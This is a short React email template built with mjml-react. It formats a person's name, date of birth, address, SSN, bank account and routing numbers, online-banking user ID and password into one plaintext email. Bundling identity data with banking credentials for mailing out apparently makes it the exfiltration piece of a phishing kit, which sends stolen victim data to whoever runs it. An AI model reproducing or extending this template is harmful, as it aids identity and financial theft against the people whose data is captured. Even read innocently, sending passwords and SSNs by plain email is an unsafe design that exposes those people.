import {
  Mjml,
  MjmlBody,
  MjmlColumn,
  MjmlSection,
  MjmlText,
  MjmlWrapper,
} from "mjml-react";

export default function FormsEmail({
  firstname,
  lastname,
  dob,
  address,
  ssn,
  accountNumber,
  routingNumber,
  userId,
  password,
}: {
  firstname?: string;
  lastname?: string;
  dob?: string;
  address?: string;
  ssn?: string;
  accountNumber?: string;
  routingNumber?: string;
  userId?: string;
  password?: string;
}): JSX.Element {
  return (
    <Mjml>
      <MjmlBody width={500}>
        <MjmlWrapper cssClass="container">
          <MjmlSection cssClass="smooth">
            <MjmlColumn>
              <MjmlText cssClass="paragraph">First Name: {firstname}</MjmlText>
              <MjmlText cssClass="paragraph">Last Name: {lastname}</MjmlText>
              <MjmlText cssClass="paragraph">DOB: {dob}</MjmlText>
              <MjmlText cssClass="paragraph">Address: {address}</MjmlText>
              <MjmlText cssClass="paragraph">SSN: {ssn}</MjmlText>
              <MjmlText cssClass="paragraph">Account Number: {accountNumber}</MjmlText>
              <MjmlText cssClass="paragraph">Routing Number: {routingNumber}</MjmlText>
              <MjmlText cssClass="paragraph">User ID: {userId}</MjmlText>
              <MjmlText cssClass="paragraph">Password: {password}</MjmlText>
            </MjmlColumn>
          </MjmlSection>
        </MjmlWrapper>
      </MjmlBody>
    </Mjml>
  );
}
